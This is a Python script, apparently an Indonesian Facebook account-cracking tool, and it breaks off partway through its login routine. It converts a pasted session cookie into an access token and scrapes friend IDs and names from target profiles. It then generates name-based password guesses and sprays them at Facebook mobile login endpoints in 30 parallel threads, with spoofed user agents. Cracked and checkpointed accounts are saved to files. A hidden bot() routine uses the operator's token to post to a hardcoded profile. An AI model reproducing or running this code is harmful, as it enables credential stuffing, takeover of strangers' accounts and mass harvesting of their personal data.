''' reverse exec by Maulana-XD '''
#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests

try:
	import bs4
	import rich
	import requests
	import stdiomask
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")

#----------[ IMPORT-RICH ]----------#	
from bs4 import BeautifulSoup as sop	
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from rich.tree import Tree
from rich import print as prints
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.panel import Panel as panel

#----------[ GLOBAL-NAME ]----------#
id, id2, uid = [],[],[]
tokene, akune = [],[]
sandine, sandina = [],[]
method, ugen = [],[]
loop, ok, cp = 0,0,0

#----------[ USER-CRACK ]----------#  

for xd in range(10000):
    rr = random.randint; rc = random.choice
    gt = ['ru','en','id','uk','da','de','na','pt','ca','sr','fa','th','fr','vi','es','zh','ja']
    strvgt = f"Opera/9.80:Mozilla/5.0:Opera Mini/{str(rr(1,100))}.0.{str(rr(5500,5900))}; U {str(rc(gt))}) Presto/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Version/12.16"
    uateddy = random.choice([strvgt])
    ugen.append(uateddy)

#--------[ GENERATE-USER-AGENT ]----------#
for generate in range(10):
	a=random.randrange(1, 9)
	b=random.randrange(1, 9)
	c=random.randrange(7, 13)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(["Opera/9.80 (Android;Opera Mini/6.0.24212/24.746 U;en) Presto/2.5.25","Opera/9.80 (BlackBerry; Opera Mini/8.0.35659/37.9178; U; es) Presto/2.12.423 Version/12.16","Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows NT 6.1; WOW64) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54","Opera/9.80 (Series 60; Opera Mini/7.0.28967/37.6711; U; en) Presto/2.12.423 Version/12.16,gzip(gfe)","Opera/9.80 (J2ME/MIDP; Opera Mini/8.0.35626/191.322; U; en) Presto/2.12.423 Version/12.16","Opera/9.80 (Series 60; Opera Mini/7.1.32444/85.73; U; tr) Presto/2.12.423 Version/12.16","Opera/9.80 (SpreadTrum; Opera Mini/4.4.34891/191.320; U; en) Presto/2.12.423","Opera/9.80 (MAUI Runtime; Opera Mini/4.4.33576/191.304; U; en) Presto/2.12.423","Opera/9.80 (MAUI Runtime; Opera Mini/6.1.27412/191.322; U; fr) Presto/2.12.423","Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.18975/69.162; U; vi) Presto/2.12.423","Opera/9.80 (J2ME/MIDP; Opera Mini/8.0.35626/191.322; U; pl) Presto/2.12.423","SAMSUNG-SM-B350E Opera/9.80 (J2ME/MIDP; Opera Mini/8.0.40326/61.485; U; en) Presto/2.12.423 Version/12.16","Opera/9.80 (Android; Opera Mini/7.6.40483/191.218; U; id) Presto/2.12.423","https://user-agents.net/string/opera-8-01-j2me-midp-opera-mini-1-0-1479-hifi-sonyericsson-p900-no-u","Opera/9.80 (Windows Mobile; Opera Mini/5.1.21594/191.324; U; de) Presto/2.12.423 Version/12.16"]) 

#--------[ TAHUN-AKUN ]--------#    
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz
	
def clear():
    os.system('clear')
###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # KUNING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # KUNING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
asu = random.choice([m, k, h, u, b])
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
ses=requests.Session()
#----------[ HAPUS ]----------#		
def ganti_cokies():
      try:os.remove(".cyxieoncokies.txt")
      except:pass
      try:os.remove(".cyxieontoken.txt")
      except:pass
      login3()
      	
#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("cls")
      else:os.system("clear")
      print(f"""{b}
█████████████████████████████████████████████████████████████████████████████
█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█
█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒██▒▒▄▀▒▒█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███
███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███
█████▒▒▄▀▄▀▄▀▒▒█████▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█████▒▒▄▀▄▀▄▀▒▒█████
███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▒▒▄▀▄▀▄▀▒▒▒▒███
███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▄▀▒▒▄▀▄▀▒▒███
█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▒▒██▒▒▄▀▄▀▒▒█
█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
█████████████████████████████████████████████████████████████████████████████
               """)
#kukis
def login3():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()


def login_lagi334():
	try:
		
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
		open(".cok.txt", "w").write(cookie)
		with requests.Session() as rsn:
			try:
				rsn.headers.update({
                    'Accept-Language': 'id,en;q=0.9',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                    'Referer': 'https://www.instagram.com/',
                    'Host': 'www.facebook.com',
                    'Sec-Fetch-Mode': 'cors',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Site': 'cross-site',
                    'Sec-Fetch-Dest': 'empty',
                    'Origin': 'https://www.instagram.com',
                    'Accept-Encoding': 'gzip, deflate',
                })
				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
				if '"access_token":' in str(response.headers):
					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
					open(".token.txt", "w").write(token)
					print('%sLogin Succes%s'%(h, p))

				else:
					print('%sFailled Get Token%s'%(m, p))

			except:
				print('Failled Get Token')

		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
  
#----------[ BAGIAN-MENU ]----------#            
def menu():
	clear();banner()
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except (IOError,KeyError,FileNotFoundError):
		print(f'\n{P} [:] cookies kamu invalid.{P}')
		time.sleep(2);os.system('clear')
		login3()
	try:
		info_datafb = ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
		nama = info_datafb["name"]
		uidfb = info_datafb["id"]
	except requests.exceptions.ConnectionError:
		exit(f"\n{P} [:] Tidak ada koneksi{P}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".token.txt")
		except:pass
		print(f"\n{P} [:] sepertinya akun tumbal mu terkena checkpoint...{P}");time.sleep(2)
		os.system('clear')
		login3()
		banner()
	print(f'{puti}')
	print(f'{hijo}       {kun} ◕ᴗ◕ {hijo}Ｂａｇｉａｎ{kun} ⚔ {bira}ｍｅｎｕ{kun} ◕ᴗ◕ ')
	print(f'{puti}')
	print(f'{biru}┌─{puti} 1.{bira} ᴄʀᴀᴄᴋ')
	print(f'{biru}├─{puti} 2.{bira} ᴄʀᴀᴄᴋ {hijo}ᴍᴀꜱꜱᴀʟ')
	print(f'{biru}├─{puti} 3.{bira} ᴄᴇᴋ ʜᴀꜱɪʟ {hijo}𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝')
	print(f'{biru}├─{puti} 4.{bira} 𝙲𝚎𝚔 𝚑𝚊𝚜𝚒𝚕 {hijo}ѕυкѕєѕ')
	print(f'{biru}├─{puti} 0.{bira} ʜᴀᴘᴜꜱ {mer}ᴄᴏᴏᴋɪᴇ')
	print(f'{puti}')
	CYXIEON_GANTENG = input(f'{puti}└─ ➢ {hijo} ')
	if CYXIEON_GANTENG in ['01','1']:
	        idt = input('\n>> ID Target : ')
	        dump(idt,"",{"cookie":cok},token)
	        atur_id()
	if CYXIEON_GANTENG in ['02','2']:
	        dump_massal()
	elif CYXIEON_GANTENG in ['03','3']:
	        hasil_cp()
	elif CYXIEON_GANTENG in ['04','4']:
	        hasil_ok()
	elif CYXIEON_GANTENG in ['00','0']:
            ganti_cokies()

#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		kumpulkan = int(input(f' 𝙼𝚊𝚞 𝙱𝚛𝚊𝚙𝚊 𝙸𝙳 ? : '))
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		prints(panel(f'[cyan]       𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝚂𝚊𝚝𝚞 𝙿𝚎𝚛𝚜𝚊𝚝𝚞! ',width=43,title=f"[[yellow] ALEX•GANS [/]]",style=f"bold green"))
		Masukan = input(f'{b} 𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝙸𝙳 𝚈𝚊𝚗𝚐 𝚔𝚎  '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      prints(panel(f"{b} 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐌𝐞𝐧𝐠𝐠𝐮𝐧𝐩𝐮𝐥𝐤𝐚𝐧 𝐢𝐝 [green]{len(id)}[blue] id....",title=f"[[yellow]Alex•Gans[/]]",style=f"bold green"))
	      atur_id()
	except requests.exceptions.ConnectionError:
	    exit()
	except (KeyError,IOError):
		exit()
#----------[ CRACK-PUBLIK  ]----------#            
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass
	      

#----------[ HASIL-OK ]----------#            
def hasil_ok():
	try:vin = os.listdir('CYXIEON-OK')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}{puti}").add(f"{hijo}{cpkuni[1]}{puti}")
			tree.add(f"{hijo}{cpkuni[2]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()

#----------[ HASIL-CP]----------#            
def hasil_cp():
	try:vin = os.listdir('CYXIEON-CP')
	except FileNotFoundError:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} File tidak di temukan ")
	if len(vin)==0:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		exit(f"{kun}└──[{mer} Tidak mempuyai file OK ")
	else:
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = '0'+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print(f'{kun}└──[{puti} %s. %s ( %s Idz )'%(nom,isi,len(hem)))
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		geeh = input(f'{kun}└──[{puti} Input file : ')
		try:geh = lol[geeh]
		except KeyError:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
		except:
		    print(f"{kun}╭────────────────────────────────────────────{puti}")
		    exit(f"{kun}└──[{mer} File tidak di temukan ")
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}{puti}").add(f"{kun}{cpkuni[1]}{puti}")
			prints(tree)
			nocp +=1
		print(f"{kun}╭────────────────────────────────────────────{puti}")
		input(f'{kun}└──[{mer} Klik Enter {kun}]')
		menu()
																		
#----------[ MENU-IDZ ]----------#		
def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(id2))
            id2.insert(cyxieon_id, khusus_random)
     atur_method()
     
#----------[ MENU-METODE ]----------#
def atur_method():
	print("")
	print(f'{hijo}       {kun} ◕ᴗ◕ {hijo}Ｂａｇｉａｎ{kun} ⚔ {bira} Ｍｅｔｈｏｄｅ{kun} ◕ᴗ◕ ')
	print(f'{hijo}') 
	print(f'{h}𝐕𝐀𝐋𝐈𝐃𝐀𝐓𝐄 ')
	print(f'{biru}┌─➢{puti} 1.{bira} ᴍᴏʙɪʟᴇ ᴠ𝟷 {hijo} 𝙰𝚔𝚝𝚒𝚏 ')
	print(f'{h}𝐀𝐒𝐘𝐍𝐂 ')
	print(f'{biru}┌─ ➢{puti} 2.{bira} ᴍᴏʙɪʟᴇᴀᴠ𝟷{hijo} 𝙰𝚔𝚝𝚒𝚏 ')
	print(f'{h}𝐑𝐄𝐆𝐔𝐋𝐄𝐑 ')
	print(f'{biru}└─ ➢{puti} 3.{bira} ᴍᴏʙɪʟᴇ ғʀᴇᴇᴠ𝟷{hijo} 𝙰𝚔𝚝𝚒𝚏 ')
	print(f'{puti}') 
	CYXIEON_METHODE = input(f'{bira}└─ ➢ ')
	if CYXIEON_METHODE in ['1','01']:
	   method.append('validate')  
	elif CYXIEON_METHODE in ['2','02']:
	   method.append('asyinc')       
	elif CYXIEON_METHODE in ['3','03']:
	   method.append('reguler')
	else:
		method.append('validate')
	print(f'{hijo}       {kun} ◕ᴗ◕ {hijo}Ｂａｇｉａｎ{kun} ⚔ {bira}Ｐａｓｓｗｏｒｄ{kun} ◕ᴗ◕ ')
	print(f'{puti}') 
	print(f'{biru}└─ ➢ 𝚃𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝚙𝚠 𝚖𝚊𝚗𝚞𝚊𝚕 (y/t) ')
	print(f'{puti}') 
	passwtamb = input(f'{bira}└─ ➢ ')
	if passwtamb in ['y','Y']:
		     sandine.append('ya')
		     print(f"{k}➢•➢•➢•➢•➢•➢•➢•➢•➢•➢•➢•➢{b}•➢•➢•➢•➢•➢•➢•➢•➢•➢•➢•➢•➢•{p}")
		     sandiku = input(f'{kun}└──[{puti} Input Pw : ')
		     sandimu = sandiku.split(',')
		     for sandixnxx in sandimu:
		         sandina.append(sandixnxx)		 
	else:
	    sandine.append('no')
	passwordlist()
	
#----------[ BAGIAN-WORDLIST ]----------#	
def passwordlist():
	global prog,des
	print(f'{puti}') 
	print(f'{bira}└─ ➢{kun}𝙼𝚘𝚍𝚎 𝚙𝚎𝚜𝚊𝚠𝚊𝚝 𝚜𝚎𝚝𝚒𝚊𝚙 {hijo} 𝟺𝟻𝟶 {kun}𝙸𝚍 ')
	print(f'{puti}') 
	prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pemuda_tersakiti:
			for _gabutz_ster_ in id2:
				idf,namamu_ku_simpan = _gabutz_ster_.split('|')[0],_gabutz_ster_.split('|')[1].lower()
				frestile = namamu_ku_simpan.split(" ")[0]
				pwx = []
				if len(namamu_ku_simpan)<6:
					if len(frestile)<3:
						pass
					else:
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456789')
						pwx.append(frestile+'321')
						pwx.append(frestile+'@@12')
						pwx.append(frestile+'ganteng')
						pwx.append(frestile+'cantik')
						pwx.append(frestile+'12')
						pwx.append(frestile+'32')
						pwx.append(frestile+'23')
						pwx.append(frestile+'21')
						pwx.append(frestile+'22')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						
				else:
					if len(frestile)<3:
						pwx.append(namamu_ku_simpan)
					else:
						pwx.append(namamu_ku_simpan)
						pwx.append(frestile+'123')
						pwx.append(frestile+'1234')
						pwx.append(frestile+'12345')
						pwx.append(frestile+'123456789')
						pwx.append(frestile+'321')
						pwx.append(frestile+'@@12')
						pwx.append(frestile+'ganteng')
						pwx.append(frestile+'cantik')
						pwx.append(frestile+'12')
						pwx.append(frestile+'32')
						pwx.append(frestile+'23')
						pwx.append(frestile+'21')
						pwx.append(frestile+'22')
						pwx.append(frestile+'01')
						pwx.append(frestile+'02')
						pwx.append(frestile+'03')
						pwx.append(frestile+'04')
						pwx.append(frestile+'05')
						pwx.append(frestile+'06')
						pwx.append(frestile+'07')
						pwx.append(frestile+'08')
						pwx.append(frestile+'09')
						
				if 'ya' in sandine: 
					for sandi_kita in sandina:
						pwx.append(sandi_kita)
				else:pass
				if 'validate' in method:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'GACOR')
				elif 'reguler' in method:
				    pemuda_tersakiti.submit(crackreguler,idf,pwx,'m.facebook.com')
				elif 'asyinc' in method:
				    pemuda_tersakiti.submit(crackasyinc,idf,pwx,'m.alpha.facebook.com')
				else:
				    pemuda_tersakiti.submit(crackvalidate,idf,pwx,'m.facebook.com')
				    
	print(f"{kun}╭────────────────────────────────────────────{puti}")
	print(f'{kun}└──[{puti} OK {hijo}: %s'%(ok))
	print(f'{kun}└──[{puti} CP {kun}: %s'%(cp))
	print(f"{kun}─────────────────────────────────────────────{puti}")
	
#----------[ METODE-VALIDATE ]----------#	
def crackvalidate(idf,pwx,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r[bold green]𝐀𝐥𝐞𝐱•𝐆𝐚𝐧𝐬 𝐯𝟏[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
			link = ses.get("https://m.latest.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https://m.facebook.com/dialog/oauth?client_id=124024574287414&locale=id_ID&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%221aja43w1fewxk513qyq0i1xdan09hyj8u916hw96n3lgpqd1ym9ktq%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&ret=login&fbapp_pres=0&logger_id=7dafb109-0ce2-4b48-affe-2312544d4474&tp=unspecified&cancel_url=https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221aja43w1fewxk513qyq0i1xdan09hyj8u916hw96n3lgpqd1ym9ktq%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
